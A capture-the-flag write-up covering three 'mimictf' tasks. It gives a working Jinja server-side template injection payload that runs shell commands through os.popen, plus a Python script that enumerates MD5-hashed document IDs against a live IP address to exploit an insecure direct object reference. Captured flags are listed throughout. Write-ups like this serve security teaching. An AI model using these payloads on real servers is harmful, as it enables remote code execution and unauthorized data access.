Welcome flag 

Just check TG group by link in task description and search flag!

FLAG:

    mimictf{w3lc0m3_t0_th3_c1ub_buddy}

Task-2

Here we find `SSTI` vulnerability by entering the payload `{{7*‘7’}}` instead of the username and see that the response is 49. So it's vulnerable jinja template for `SSTI`

But when we try other payloads, the server may check certain characters, so just try to bypass this by using a different type of possible payloads. 

payload:

    {{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}

FLAG:

    mimictf{55t1_1nj3ct10n_s1mple99928}

TASK-3

Script:

    import hashlib
    import requests
    
    base_url = "http://134.209.254.230:5002/document/"  # Change to real target URL with id param
    
    def md5_hash(value):
        return hashlib.md5(str(value).encode()).hexdigest()
    
    max_length = 0
    max_id = None
    max_response = None
    
    for i in range(1, 200):  # Adjust upper range as needed
        md5_id = md5_hash(i)
        url = base_url + md5_id
        response = requests.get(url)
        content_length = len(response.text)
        print(f"Trying ID: {i} MD5: {md5_id} Length: {content_length}")
        
        if content_length > max_length:
            max_length = content_length
            max_id = i
            max_response = response.text
    
    print(f"\nMax response length: {max_length} for ID: {max_id} with MD5: {md5_hash(max_id)}")
    print("Response content:\n", max_response)

By running the script, we can see that `id` `127` has a larger response size than the others, so we can find our flag using the MD5 hash 127 `ec5decca5ed3d6b8079e2e7e7bacc9f2`.

FLAG:

    mimictf{1d0r_w1th_h4sh3d_1ds_15_n0t_s4f3}
